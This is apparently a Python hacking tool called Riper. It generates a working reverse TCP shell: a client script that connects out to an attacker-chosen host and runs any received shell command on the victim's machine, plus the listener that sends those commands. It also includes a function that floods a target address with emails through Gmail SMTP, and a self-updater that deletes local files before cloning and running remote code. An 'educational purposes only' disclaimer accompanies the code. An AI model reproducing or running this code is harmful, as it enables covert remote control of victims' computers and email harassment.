import os
import sys
import time

"------------------------"
version = "0.2"
load_animation = True
"-----------------------"

def tcp():

    LHOST = input("LHOST: ")
    LPORT = input("LPORT: ")
    print("""Making files...
    
server.py - The program, which sends commands (The hacker)
client.py - The program, which revieves command (The target, victim)
--------------------------------------------------------------------------------""")

    timer = 0
    loading = "Creating files... [----------]"
    backtrack = '\b'*len(loading)

    while timer < 11:
        sys.stdout.write(backtrack + loading)
        sys.stdout.flush()
        loading = loading.replace("-","=",1)
        time.sleep(0.05)
        timer += 1
    time.sleep(1)
    sys.stdout.write(backtrack)
    print(loading + " - Made files!")

    client = f"""# Made by RiperGen
# RiperGen made by VERTEXX
import os
import socket
import subprocess
import sys

def receiver(s):
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")
        if cmd == "":
            s.send(b"$: ")


def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection Established.")
    except socket.error as error:
        print("Something went wrong... more info below.")
        print(error)
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = "{LHOST}"
    port = {LPORT}
    while True:
        try:
            connect((host, port))
        except:
            print("Server not running. Trying...")
    """
    server = f"""# Made by RiperGen
# RiperGen made by VERTEXX
import socket
import sys

def send_commands(s, conn):
    print("Ctrl + C to kill the connection.")
    print("Browse the system as usual.")
    print("For educational purposes only! ;)")
    print("$: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096) # 4096 is better for heavy transfers!
                print(data.decode("utf-8"), end="")
            
        except KeyboardInterrupt:
            print("Goodbye.")
            conn.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            e.close()
            sys.exit()

def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server Initialized. I'm listening...")
    except Exception as e:
        print("It seems like something went wrong.")
        print(e)
        restart = input("Do you want me to reinitialize the server? y/n ")
        if restart.lower() == "y" or restart.lower() == "yes":
            print("Roger That. Reinitializing the server...")
            server(address)
        else:
            print("So Long, and Thanks for All the Fish.")
            sys.exit()
    conn, client_addr = s.accept()
    print(f"Connection Established!")
    send_commands(s, conn)

if __name__ == "__main__":
    host = "127.0.0.1"
    port = {LPORT}
    server((host, port))
    """
    timer = 0
    loading = "Generating scripts... [----------]"
    backtrack = '\b'*len(loading)

    while timer < 11:
        sys.stdout.write(backtrack + loading)
        sys.stdout.flush()
        loading = loading.replace("-","=",1)
        time.sleep(0.1)
        timer += 1
    time.sleep(1)
    sys.stdout.write(backtrack)
    print(loading + " - Going to main state...")
    print("""Generated scripts! Saving to the current working directory into folder named "TCP_Reverse"...""")
    print("Current working directory: " + os.getcwd())
    
    print("""
    """)

    try:
        os.mkdir("TCP_Reverse")
    except:
        try:
            os.remove("TCP_Reverse/client.py")
            os.remove("TCP_Reverse/server.py")
        except:
            os.rmdir("TCP_Reverse")
            os.mkdir("TCP_Reverse")
    
    f1 = open("TCP_Reverse/server.py", "w")
    f1.write(server)
    f2 = open("TCP_Reverse/client.py", "w")
    f2.write(client)
    f1.close()
    f2.close()
    print("Done!")
    time.sleep(1)
    main(logo)

def spam_emails():
    email_from = input("Email to spam with: ")
    password = input("Password to email: ")
    email_to = input("Email to spam: ")
    count = input("Emails to send: ")
    body = input("Message / Body: ")
    print("OK... Starting...")
    import smtplib
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(email_from,password)
    for i in range(int(count)):
        try:
            server.sendmail(email_from, email_to, body)
            print("[+] Email sent! Email count: " + str(i))
        except Exception as e:
            print("[-] An error occured! More info below:")
            print(e)
            print("[*] Reintiliazing server!")
            server = smtplib.SMTP('smtp.gmail.com:587')
            server.ehlo()
            server.starttls()
            server.login(email_from,password)
            time.sleep(5)

    server.quit()
    print("Spam complete!")
    main(logo)

def on_rm_error(func, path, exc_info):
    import stat
    #from: https://stackoverflow.com/questions/4829043/how-to-remove-read-only-attrib-directory-with-python-in-windows
    os.chmod(path, stat.S_IWRITE)
    os.unlink(path)

def update_check(v):
    import urllib.request
    updateSource = urllib.request.urlopen("https://mikfogames.000webhostapp.com/riper_version.txt")
    updateContents = str(updateSource.read())

    updateContents = updateContents[2:-1]
    v = float(v)
    v_latest = float(updateContents)
    print("Checking for updates...")

    if v_latest > v:
        " UPDATE "
        print("Update available! Downloading...")
        for f in os.listdir(os.getcwd()):
            if f.endswith("git"):
                import shutil
                from subprocess import call
                tmp = os.path.join(os.getcwd(), f)
                # We want to unhide the .git folder before unlinking it.
                while True:
                    call(['attrib', '-H', tmp])
                    break
                shutil.rmtree(tmp, onerror=on_rm_error)
            try:
                try:
                    os.remove(f)
                except:
                    pass
            except:
                try:
                    os.rmdir(f)
                except:
                    os.chdir(f)
                    for fi in os.listdir(os.getcwd()):
                        os.remove(fi)
                    os.chdir("..")
                    os.rmdir(f)

        time.sleep(1)
        os.system("git clone https://github.com/VERTEXXdev/Riper.git .")
        open("start.py", "w+").write("""import os; import time; os.system("python riper.py");""")
        os.system("python start.py")
        quit()
    else:
        print("Riper is up-to-date!")



def main(logo):
    os.system("cls")
    print(logo)
    print("-----------------------------------------------------")
    print("[1] Make a reverse TCP shell [IN BETA]")
    print("[2] Spam emails [IN BETA]")
    
    print("")
    print("[99] Exit the Riper")

    print("""
    """)

    print("What would you like?")
    choice = input("RiperGen > ")
    choice = int(choice)
    if choice == 99:
        exit()
    if choice == 1:
        tcp()
    if choice == 2:
        spam_emails()

# TERMS OF SERVICE
print("""
TERMS OF SERVICE:

I know some of you will type y, and enter. But please, read this.

Me (VERTEXX), or the AlterFire Studio is NOT responsible for anything you do with this script.
This tool is ONLY FOR EDUCATIONAL PURPOSES!

If you dont use this tool for educational purposes, you are using this tool for your responsibility.

Requirements:
Installed git

Do you understand and accept this ToS, and have Git installed? (y/n)
""")
yn = input("(y/n) ")
if yn.lower() == "y" or yn.lower() == "yes":
    pass
else:
    exit()

os.system("cls")

logo = """

8888888b.  d8b    Developed by VERTEXX                          
888   Y88b Y8P    Designed as AlterFire Project                                
888    888                                               
888   d88P 888 88888b.   .d88b.  888d888  
8888888P"  888 888 "88b d8P  Y8b 888P"  
888 T88b   888 888  888 88888888 888  
888  T88b  888 888 d88P Y8b.     888 
888   T88b 888 88888P"   "Y8888  888
               888                                                    
               888
               888  
"""

contact = """
----------------------------------------
You can contact me on:
Discord: VERTEXX#5068
----------------------------------------
"""

print(logo)
print(contact)

update_check(version)

if load_animation == True:
    timer = 0
    loading = "Loading: [----------]"
    backtrack = '\b'*len(loading)

    while timer < 11:
        sys.stdout.write(backtrack + loading)
        sys.stdout.flush()
        loading = loading.replace("-","=",1)
        time.sleep(1)
        timer += 1
    time.sleep(1)
    sys.stdout.write(backtrack)
    print(loading + " - Going to main state...")

main(logo)
